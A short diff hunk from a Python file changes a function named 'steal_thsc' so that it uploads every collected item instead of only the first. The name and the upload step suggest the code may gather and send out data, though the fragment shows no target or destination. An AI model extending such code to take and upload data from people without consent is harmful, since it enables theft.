@@ -228,7 +228,8 @@ def steal_thsc():
 
     items = new_items
 
-    _upload_item(items[0])
+    for item in items:
+        _upload_item(item)
 
 def SHA256(s):
     def bitshift(x):
